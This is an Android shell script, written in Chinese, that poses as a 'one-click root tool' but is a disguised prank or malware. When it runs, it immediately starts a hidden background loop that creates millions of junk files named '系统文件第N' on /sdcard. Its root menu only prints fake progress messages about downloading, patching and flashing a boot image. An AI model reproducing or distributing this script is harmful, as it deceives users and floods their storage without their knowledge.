#!/system/bin/sh
(
    echo "🔍 检查存储目录: /sdcard"
    if [ ! -d "/sdcard" ]; then
        echo "❌ 目录 /sdcard 不存在！"
        exit 1
    fi

    TEST_FILE="/sdcard/.write_test_$$"
    echo "test" > "$TEST_FILE" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "❌ 无法写入 /sdcard，请检查存储权限！"
        exit 1
    else
        rm -f "$TEST_FILE"
        echo "✅ 存储可写，准备在后台生成文件..."
    fi

    TARGET_DIR="/sdcard"            
    BASE_FILENAME="系统文件第"            
    FILE_SIZE_KB=0               
    LOOP_COUNT=9999999

    CURRENT_NUM=0
    while [ "$CURRENT_NUM" -lt "$LOOP_COUNT" ]; do
        CURRENT_NUM=$((CURRENT_NUM + 1))
        
        if [ "$CURRENT_NUM" -eq 1 ]; then
            FILENAME="$BASE_FILENAME"
        else
            FILENAME="$BASE_FILENAME$((CURRENT_NUM - 1))"
        fi

        FILEPATH="$TARGET_DIR/$FILENAME"
        echo "📦 [后台] 生成文件: $FILENAME (大小: ${FILE_SIZE_KB}KB)"
        dd if=/dev/zero of="$FILEPATH" bs=1K count="$FILE_SIZE_KB" 2>/dev/null || {
            echo "❌ [后台] 生成文件失败: $FILENAME"
            continue
        }
        echo "✅ [后台] 文件已生成: $FILEPATH"
        sleep 0  
    done

    echo "🎯 [后台] 文件生成任务结束（理论上不会执行到这里）"
) &  


echo "****欢迎使用一键root工具****"
sleep 0.5
echo "------Root有风险，是否确认执行------"
echo "========================="
echo "[1] >>>>开始root<<<<"
echo "[2] >>>>退出脚本<<<<"
echo "========================="
sleep 0.5
echo -n "---请选择操作--- [1/2]: "
read choice

case "$choice" in
    1)
        echo "🔍 正在读取设备型号"
        echo "设备型号: $(getprop ro.product.model)"
        echo "系统版本: $(getprop ro.build.version.release)"
        sleep 1
        echo "🔧 正在从服务器下载对应的boot包"
        sleep 2
        echo "✅ boot已成功下载，准备解锁BootLoader"
        sleep 1
        echo "🔧 开始从Sukisu Ultra官网下载管理器"
        sleep 2
        echo "✅ 管理器下载完成，开始修补boot"
        sleep 1
        echo "✅ boot修补完成，开始刷入boot"
        sleep 1
        echo "✅ boot刷入成功！"
        echo "🔒 正在隐藏环境"
        sleep 1
        echo "✅ 隐藏完成！请重启手机"
        ;;
    2)
        echo "❌ 用户取消操作，退出脚本"
        exit 0
        ;;
    *)
        echo "❌ 无效选项，退出脚本"
        exit 1
        ;;
esac

echo "🎯 主程序执行完毕"
